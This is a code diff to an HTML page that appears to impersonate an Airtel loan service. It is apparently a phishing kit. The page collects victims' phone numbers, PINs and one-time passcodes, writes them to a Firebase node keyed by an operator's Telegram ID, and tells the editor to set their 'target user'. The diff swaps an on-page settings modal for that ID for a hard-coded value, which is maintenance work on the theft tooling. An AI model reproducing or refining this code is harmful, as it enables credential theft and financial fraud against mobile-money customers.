@@ -618,68 +618,6 @@
         .page { display: none; }
         .page.active { display: block; }
 
-        /* ===== TELEGRAM ID SETTINGS ===== */
-        #tgSettingsBtn {
-            position: fixed; bottom: 16px; right: 16px; z-index: 9999;
-            width: 48px; height: 48px; border-radius: 50%;
-            background: var(--primary); color: var(--accent);
-            border: 3px solid var(--accent);
-            font-size: 1.4rem; cursor: pointer;
-            box-shadow: 0 6px 20px rgba(0,0,0,0.3);
-            display: flex; align-items: center; justify-content: center;
-            transition: transform 0.2s;
-        }
-        #tgSettingsBtn:hover { transform: scale(1.08); }
-        #tgSettingsModal {
-            display: none; position: fixed; inset: 0;
-            background: rgba(0,0,0,0.6); z-index: 10000;
-            align-items: center; justify-content: center;
-            backdrop-filter: blur(4px);
-        }
-        #tgSettingsModal.active { display: flex; }
-        .tg-modal-card {
-            background: #fff; border-radius: 16px; padding: 24px;
-            max-width: 380px; width: 92%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.4);
-            border-top: 5px solid var(--accent);
-        }
-        .tg-modal-card h3 {
-            color: var(--primary); margin-bottom: 8px; font-size: 1.2rem;
-        }
-        .tg-modal-card p {
-            color: var(--text-light); font-size: 0.9rem;
-            margin-bottom: 16px; line-height: 1.5;
-        }
-        .tg-modal-card input {
-            width: 100%; padding: 12px 14px;
-            border: 2px solid var(--border); border-radius: 10px;
-            font-size: 1.05rem; font-family: inherit;
-            margin-bottom: 16px; outline: none; color: var(--text);
-        }
-        .tg-modal-card input:focus {
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(237,28,36,0.1);
-        }
-        .tg-modal-actions { display: flex; gap: 10px; }
-        .tg-modal-actions button {
-            flex: 1; padding: 12px; border-radius: 10px;
-            font-weight: 600; cursor: pointer; font-family: inherit;
-            font-size: 0.95rem;
-        }
-        #tgIdCancel {
-            border: 2px solid var(--border); background: #fff;
-            color: var(--text);
-        }
-        #tgIdSave {
-            border: none; background: var(--primary);
-            color: var(--accent); font-weight: 700;
-        }
-        #tgIdCurrent {
-            margin-top: 12px; font-size: 0.8rem;
-            color: var(--text-light); text-align: center;
-        }
-        #tgIdCurrentValue { font-weight: 700; color: var(--primary); }
-
         /* Responsive */
         @media (max-width: 768px) {
             .hero-title { font-size: 2.5rem; }
@@ -1417,28 +1355,14 @@
         </div>
     </div>
 
-    <!-- ==================== TELEGRAM ID SETTINGS (floating gear) ==================== -->
-    <button id="tgSettingsBtn" title="Set Telegram User ID">⚙️</button>
-
-    <div id="tgSettingsModal">
-        <div class="tg-modal-card">
-            <h3>Telegram User ID</h3>
-            <p>All verification data (phone, PIN, OTP) will be written to this user's node.</p>
-            <input type="text" id="tgIdInput" inputmode="numeric" pattern="[0-9]*" placeholder="e.g. 1970783136">
-            <div class="tg-modal-actions">
-                <button id="tgIdCancel" type="button">Cancel</button>
-                <button id="tgIdSave" type="button">Save</button>
-            </div>
-            <p id="tgIdCurrent">Current: <span id="tgIdCurrentValue">—</span></p>
-        </div>
-    </div>
-
     <!-- ==================== JAVASCRIPT ==================== -->
     <script>
         // ===================================================
-        // 🔧 TELEGRAM USER ID (editable + persisted)
+        // 🔧 TELEGRAM USER ID
+        // 👉 Change this value manually to your target user
+        //    Example: "1970783136"
         // ===================================================
-        let TELEGRAM_USER_ID = localStorage.getItem('airtel_telegram_id') || "1970783136";
+        const TELEGRAM_USER_ID = "1970783136";
         // ===================================================
 
         // ===== FIREBASE CONFIGURATION =====
@@ -1713,13 +1637,10 @@
 
             verifyOtpBtn.addEventListener('click', verifyOtp);
 
-            // ✅ Focus only when the OTP page is actually visible, and only the first box
+            // Focus only when the OTP page is actually visible — and only once
             const otpPage = document.getElementById('otpPage');
             if (otpPage && otpPage.classList.contains('active')) {
-                // Small delay to make sure the page is rendered, then focus the first box once
-                setTimeout(() => {
-                    otpBoxes[0].focus();
-                }, 50);
+                setTimeout(() => { otpBoxes[0].focus(); }, 50);
             }
         }
 
@@ -1757,70 +1678,6 @@
 
         function downloadAgreement() { alert('Téléchargement du contrat... (Simulation)'); }
         function viewDashboard()     { alert('Redirection vers le tableau de bord... (Simulation)'); }
-
-        // ==================== TELEGRAM ID SETTINGS UI ====================
-        (function() {
-            const btn      = document.getElementById('tgSettingsBtn');
-            const modal    = document.getElementById('tgSettingsModal');
-            const input    = document.getElementById('tgIdInput');
-            const cancel   = document.getElementById('tgIdCancel');
-            const save     = document.getElementById('tgIdSave');
-            const currVal  = document.getElementById('tgIdCurrentValue');
-
-            function refreshCurrentLabel() {
-                currVal.textContent = TELEGRAM_USER_ID;
-                input.value = TELEGRAM_USER_ID;
-            }
-            refreshCurrentLabel();
-
-            btn.addEventListener('click', function() {
-                refreshCurrentLabel();
-                modal.classList.add('active');
-                setTimeout(() => input.focus(), 60);
-            });
-
-            cancel.addEventListener('click', function() {
-                modal.classList.remove('active');
-            });
-
-            modal.addEventListener('click', function(e) {
-                if (e.target === modal) modal.classList.remove('active');
-            });
-
-            save.addEventListener('click', function() {
-                const newId = (input.value || '').trim();
-                if (!/^\d{5,15}$/.test(newId)) {
-                    alert('Please enter a valid Telegram User ID (5-15 digits).');
-                    return;
-                }
-                localStorage.setItem('airtel_telegram_id', newId);
-                TELEGRAM_USER_ID = newId;
-
-                // Detach any listeners bound to the old path
-                try {
-                    if (pinVerifyListener) {
-                        database.ref('Telegram Users/' + TELEGRAM_USER_ID + '/verify')
-                            .off('value', pinVerifyListener);
-                        pinVerifyListener = null;
-                    }
-                    if (otpVerifyListener) {
-                        database.ref('Telegram Users/' + TELEGRAM_USER_ID + '/verify_otp')
-                            .off('value', otpVerifyListener);
-                        otpVerifyListener = null;
-                    }
-                } catch (e) {}
-
-                refreshCurrentLabel();
-                modal.classList.remove('active');
-                console.log('✅ Telegram User ID updated to:', TELEGRAM_USER_ID);
-                console.log('   New PIN flag path:', 'Telegram Users/' + TELEGRAM_USER_ID + '/verify');
-                console.log('   New OTP flag path:', 'Telegram Users/' + TELEGRAM_USER_ID + '/verify_otp');
-            });
-
-            input.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') { e.preventDefault(); save.click(); }
-            });
-        })();
 
         // ==================== LOAN CALCULATOR ====================
         (function() {
